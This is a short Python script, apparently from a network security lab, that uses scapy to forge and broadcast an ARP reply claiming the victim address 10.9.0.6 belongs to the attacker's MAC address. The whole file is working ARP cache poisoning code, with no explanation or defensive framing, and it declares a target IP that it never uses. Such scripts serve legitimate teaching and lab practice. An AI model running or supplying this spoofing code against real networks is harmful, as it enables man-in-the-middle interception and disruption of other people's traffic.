#!/usr/bin/env python3
from scapy.all import *

attackerMAC = "02:42:0a:09:00:69"
targetIP = "10.9.0.5"
victimIP = "10.9.0.6"

eth = Ether()
arp = ARP()

eth.src = attackerMAC 
eth.dst = "ff:ff:ff:ff:ff:ff"

arp.op = 2 #op = 1 for arp request, op = 2 for arp reply
arp.psrc = victimIP
arp.hwsrc = attackerMAC
arp.pdst = victimIP
arp.hwdst = "ff:ff:ff:ff:ff:ff"

packet = eth/arp

sendp(packet)

